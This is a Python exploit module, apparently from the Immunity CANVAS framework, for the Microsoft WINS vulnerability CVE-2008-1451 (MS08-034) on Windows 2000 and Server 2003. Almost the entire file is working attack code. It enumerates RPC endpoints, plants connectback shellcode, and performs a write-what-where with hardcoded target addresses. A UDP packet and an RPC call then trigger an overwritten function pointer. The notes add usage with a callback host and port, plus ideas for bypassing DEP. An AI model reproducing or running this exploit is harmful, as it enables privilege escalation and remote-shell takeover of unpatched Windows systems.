#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import socket
import time
import struct
import base64

from exploitutils import *
from tcpexploit import tcpexploit
from shelllistener import *
from MOSDEF import mosdef
from msrpc import *
import canvasengine

NAME='Microsoft WINS Server Vulnerability'
DESCRIPTION='Microsoft WINS Server Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['CVE Name'] = 'CVE-2008-1451'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1451'
DOCUMENTATION['CVS URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1451'
DOCUMENTATION['MSRC']='http://www.microsoft.com/technet/security/Bulletin/MS08-034.mspx'
DOCUMENTATION['Date public']='06/10/2008'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']
PROPERTY['MSADV']='MS08-034'

NOTES="""
*EARLY POC*: Still some reliability work to do.

At this stage, you have to *manually* provide the UDP port used by WINS notification socket.
Later versions might be able to do that automatically. Why wouldn't it be exploitable remotely?
It seems that the socket is bound to localhost only after MS04-045/UR1!

I put a connectback shellcode at the moment because it was faster this way, I'll come up with
a better one soon.

DEP OptIn or above won't allow us to use the shared section trick on 2003. Any idea?
Using RPC, our data ends up at [[esp+4]+8]. If we can make esp point in there and return, we
can then do a ret2libc to disable DEP.

Wins.exe: 5.0.2195.6870 (MS04-045)
          5.0.2195.7005 (UR1)
          5.0.2195.7155 (MS08-034) *patched*
          5.2.3790.1830 (SP0?)
          5.2.3790.3959 (SP1)
Usage:
Win32/MOSDEF$ runmodule ms08_034 -p 1046 -l 10.10.11.1 -d 5555
"""

TODO="""
"""

#All the versioning is done by the exploit
targets={
    0: ['Autoversioning',0],
    1: ['Windows 2000 SP4',0x010246b4,'811109bf-a4e1-11d1-ab54-00a0c91e9b45',1],
    2: ['Windows Server 2003 SP0&SP1 (DEP AlwaysOff)',0x010256e8,'811109bf-a4e1-11d1-ab54-00a0c91e9b45',1],
}

class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.result=0
        self.lpcname=''
        self.port=1027 #WINS notification socket UDP port
        self.rpcport=0 #WINS RPC interface TCP port
        self.badstring=''
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        return self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)

    def getArgs(self):
        self.port=int(self.argsDict.get('port',self.port))
        self.lpcname=self.argsDict.get('lpcname',self.lpcname)
        self.rpcport=int(self.argsDict.get('rpcport',self.rpcport))
        return

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        unsued,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        version=0
        if major==5 and minor==0:
            version=1 #Windows 2000 SP4
        elif major==5 and minor==2:
            version=2 #Windows Server 2003 SP0&SP1
        if version==0:
            self.log('This exploit is only for Windows 2000 and Windows Server 2003')
            return 0
        info,where,iface,opnum=targets[version]
        if self.lpcname=='':
            self.log('Listing RPC interfaces, this might take a while...')
            rpcdump=epmapperdump('127.0.0.1',135,getsock=self)
            for entry in rpcdump:
                rpcinfo=entry.getinfo().split(':')
                if rpcinfo[0]==iface and rpcinfo[2]=='ncalrpc':
                    self.lpcname='\\RPC Control\\'+rpcinfo[3]
                elif rpcinfo[0]==iface and rpcinfo[2]=='tcp':
                    self.rpcport=int(rpcinfo[3])
        if self.lpcname=='':
            self.log('WINS ncalrpc could not be found')
            return 0
        if self.rpcport==0:
            self.log('WINS ncacn_ip_tcp port could not be found')
            return 0
        data=''
        data+='\xeb\x06AA' #jmp forward
        data+='CCCC' #overwritten
        data+=self.createShellcode() #'\xcc'*0x200 #shellcode
        address=node.shell.WLSIgetShellcode(self.lpcname,data)
        if address==0:
            return 0
        data=''
        data+=struct.pack('<L',address) #what
        data+=struct.pack('<L',where) #where
        address=node.shell.WLSIgetShellcode(self.lpcname,data)
        if address==0:
            return 0
        data=''
        data+=struct.pack('<LLLLLLLLLLLL',0,0,1,0,0xffffffff,0,0,0,0,0,0,address)
        address=node.shell.WLSIgetShellcode(self.lpcname,data)
        if address==0:
            return 0
        self.log('Sending packet to port %d'%(self.port))
        s=self.getudpsock()
        s.connect(('127.0.0.1',self.port)) #local connection
        data=''
        data+=struct.pack('<LLLLLL',1,0,1,0,1,address)
        s.send(data)
        s.close()
        success,s=msrpcbind(iface,1,0,'127.0.0.1',self.rpcport,0,getsock=self)
        if success!=1 or s==None:
            self.log('WINS RPC bind failed')
            return 0
        data=''
        #data+=struct.pack('<L',1) #[unique]
        #data+=s_dce_raw_unistring('A'*512)
        #data+=struct.pack('<L',0)
        data+='A'*1024
        msrpcsend(s,data,opnum,0) #triggers the overwritten function pointer
        return 0

    def run(self):
        self.getArgs()
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
